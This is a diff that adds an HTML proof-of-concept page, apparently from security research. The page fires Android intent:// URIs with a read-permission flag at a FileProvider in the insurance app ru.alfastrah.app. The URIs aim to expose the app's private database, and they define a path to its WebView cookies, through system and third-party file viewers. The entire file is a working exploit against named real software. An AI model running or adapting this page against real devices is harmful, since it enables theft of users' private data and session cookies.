@@ -1,0 +1,46 @@
+<html>
+<body>
+  <h3>Test intent:// file sharing</h3>
+  <button onclick="test1()">Test 1: type=*/*</button><br><br>
+  <button onclick="test2()">Test 2: text/plain</button><br><br>
+  <button onclick="test3()">Test 3: DocumentsUI</button><br><br>
+  <button onclick="test4()">Test 4: Google Files</button><br><br>
+  <button onclick="test5()">Test 5: Samsung Files</button><br><br>
+  <div id="log"></div>
+
+  <script>
+  var db = "content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/databases/alfa_db";
+  var cookies = "content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/app_webview/Default/Cookies";
+
+  function log(msg) { document.getElementById('log').innerHTML += msg + '<br>'; }
+
+  function test1() {
+    log("Trying */*...");
+    location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + encodeURIComponent(db) + ";type=*/*;launchFlags=0x1;end";
+  }
+
+  function test2() {
+    log("Trying text/plain (forces text viewer)...");
+    location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + encodeURIComponent(db) + ";type=text/plain;launchFlags=0x1;end";
+  }
+
+  function test3() {
+    log("Trying DocumentsUI...");
+    location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + encodeURIComponent(db) +
+  ";type=*/*;launchFlags=0x1;component=com.android.documentsui/.files.FilesActivity;end";
+  }
+
+  function test4() {
+    log("Trying Google Files...");
+    location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + encodeURIComponent(db) +
+  ";type=*/*;launchFlags=0x1;package=com.google.android.apps.nbu.files;end";
+  }
+
+  function test5() {
+    log("Trying Samsung My Files...");
+    location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + encodeURIComponent(db) +
+  ";type=*/*;launchFlags=0x1;package=com.sec.android.app.myfiles;end";
+  }
+</script>
+</body>
+</html>
